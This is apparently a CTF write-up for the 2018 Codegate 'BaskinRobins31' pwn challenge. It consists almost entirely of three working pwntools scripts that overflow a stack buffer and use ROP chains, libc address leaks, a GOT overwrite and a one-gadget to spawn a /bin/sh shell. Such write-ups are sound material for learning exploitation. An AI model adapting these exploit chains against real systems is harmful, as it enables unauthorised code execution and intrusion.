---
title: "2018 Codegate BaskinRobins31"
date: 2019-11-8
tags: [Codegate]
categories: [Pwn]
---

> puts leak
>
> bss -> /bin/sh\x00 
>
> main -> RTL

```python
from pwn import *

# context.log_level = 'debug'
context.arch = 'amd64'
 
e = ELF('./BaskinRobins31')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./BaskinRobins31')
 
popret = 0x0000000000400bc3 # pop rdi ; ret
pop3ret = 0x000000000040087a # pop rdi ; pop rsi ; pop rdx ; ret
cmd = '/bin/sh\x00'
bss = e.bss()
 
pay = 'A'*184
pay += flat(popret,e.got['puts'],e.plt['puts'])
pay += flat(pop3ret,0,bss,len(cmd)+2,e.plt['read'])
pay += flat(e.symbols['your_turn'])
p.sendlineafter('(1-3)\n',pay)
 
p.recvuntil('...:( \n')
puts = u64(p.recv(6)+'\x00\x00')
log.info('puts : ' + hex(puts))
libc_base = puts - libc.symbols['puts']
log.info('libc_base : ' + hex(libc_base))
system = libc_base + libc.symbols['system']
log.info('system : ' + hex(system))
 
p.sendline(cmd)
 
pay2 = 'A'*184
pay2 += flat(popret,bss,system)
p.sendlineafter('(1-3)\n',pay2)
 
p.interactive()
```

<br />

>write leak
>
>write_got -> system
>
>system("/bin/sh\x00");

```python
from pwn import *
 
context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./BaskinRobins31')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./BaskinRobins31')
 
pop3ret = 0x000000000040087a # : pop rdi ; pop rsi ; pop rdx ; ret
popret = 0x0000000000400bc3 # : pop rdi ; ret
 
pay = 'A'*184
pay += flat(pop3ret,1,e.got['write'],8,e.plt['write'])
pay += flat(pop3ret,0,e.bss(),10,e.plt['read'])
pay += flat(pop3ret,0,e.got['write'],8,e.plt['read'])
pay += flat(popret,e.bss(),e.plt['write'])
 
p.sendlineafter('(1-3)\n',pay)
 
p.recvuntil('...:( \n')
write = u64(p.recv(6) + '\x00\x00')
log.info('write : ' + hex(write))
libc_base = write - libc.symbols['write']
log.info('libc_base : ' + hex(libc_base))
system = libc_base + libc.symbols['system']
log.info('system : ' + hex(system))
 
p.sendline('/bin/sh\x00')
p.sendline(p64(system))
 
p.interactive()
```

<br />

>puts leak
>
>oneshot -> libc_base + oneshot
>
>main -> ret -> oneshot

```python
from pwn import *
 
context.arch = 'amd64'
context.log_level = 'debug'
 
e = ELF('./BaskinRobins31')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./BaskinRobins31')
 
magic = 0x45216
bss = e.bss()
popret = 0x0000000000400bc3 # : pop rdi ; ret
 
pay = 'A'*(0xb0 + 8)
pay += flat(popret,e.got['puts'],e.plt['puts'])
pay += flat(e.symbols['your_turn'])
p.sendlineafter('(1-3)\n',pay)
 
p.recvuntil('...:( \n')
puts = u64(p.recv(6) + '\x00\x00')
libc_base = puts - libc.symbols['puts']
log.info('libc_base : ' + hex(libc_base))
 
magic = libc_base + magic
log.info('oneshot : ' + hex(magic))
 
pay2 = 'A'*(0xb0 + 8)
pay2 += p64(magic)
 
p.sendlineafter('(1-3)\n',pay2)
 
p.interactive()
```

